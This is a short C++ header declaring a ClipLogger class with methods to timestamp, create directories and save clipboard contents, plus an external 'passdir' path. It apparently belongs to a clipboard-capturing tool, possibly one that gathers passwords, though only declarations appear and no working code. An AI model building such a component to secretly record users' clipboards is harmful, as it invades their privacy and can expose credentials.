#pragma once
#include <string>

extern std::string passdir;

class ClipLogger
{
public:
	static std::string getNowTime();
	static bool CreateDirectoryRecursive(const std::string& directoryPath);
	static void SaveClipboard();

};

